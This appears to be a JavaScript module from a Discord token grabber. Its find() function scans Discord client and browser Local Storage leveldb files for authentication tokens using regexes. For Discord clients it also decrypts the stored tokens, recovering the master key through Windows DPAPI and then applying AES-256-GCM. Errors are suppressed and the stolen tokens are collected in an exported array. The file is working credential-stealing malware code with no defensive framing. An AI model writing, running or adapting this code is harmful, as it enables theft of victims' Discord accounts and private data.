const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const aura = require("win-dpapi");

let totalsTokens = [];
        
let cords = [
    "discord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
    "lightcord",
];

async function find(p) {
    const tail = p;
    p += "Local Storage/leveldb";

    if (!cords.some((d) => tail.includes(d))) {
        try {
            const files = await fs.promises.readdir(p);

            for (const file of files) {
                const filePath = path.join(p, file);
                const fileContent = await fs.promises.readFile(filePath, "utf8");

                const regexs = [
                    new RegExp(/mfa\.[\w-]{84}/g),
                    new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                    new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
                ];

                for (const r of regexs) {
                    const foundTokens = fileContent.match(r);
                    if (foundTokens) {
                        foundTokens.forEach((tkn) => {
                            if (!totalsTokens.includes(tkn)) return totalsTokens.push(tkn);
                        });
                    }
                }
            }
        } catch (error) { }
        return totalsTokens;
    } else {
        if (fs.existsSync(`${tail}/Local State`)) {
            try {
                fs.readdirSync(p).map((f) => {
                    (f.endsWith(".log") || f.endsWith(".ldb")) &&
                        fs
                            .readFileSync(`${p}/${f}`, "utf8")
                            .split(/\r?\n/)
                            .forEach((l) => {
                                const pattern = new RegExp(
                                    /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g,
                                );
                                const foundTokens = l.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach((tkn) => {
                                        let enc = Buffer.from(
                                            JSON.parse(fs.readFileSync(`${tail}/Local State`))
                                                .os_crypt.encrypted_key,
                                            "base64",
                                        ).slice(5);
                                        let key = aura.unprotectData(
                                            Buffer.from(enc, "utf-8"),
                                            null,
                                            "CurrentUser",
                                        );
                                        const tkns = Buffer.from(
                                            tkn.split("dQw4w9WgXcQ:")[1],
                                            "base64",
                                        );
                                        let run = tkns.slice(3, 15),
                                            mid = tkns.slice(15, tkns.length - 16);
                                        let decyph = crypto.createDecipheriv(
                                            "aes-256-gcm",
                                            key,
                                            run,
                                        );
                                        decyph.setAuthTag(
                                            tkns.slice(tkns.length - 16, tkns.length),
                                        );
                                        let out =
                                            decyph.update(mid, "base64", "utf-8") +
                                            decyph.final("utf-8");
                                        if (!totalsTokens.includes(out)) return totalsTokens.push(out);
                                    });
                                }
                            });
                });
            } catch (error) { }
            return totalsTokens;
        }
    }
}

module.exports = {
    find,
    totalsTokens
}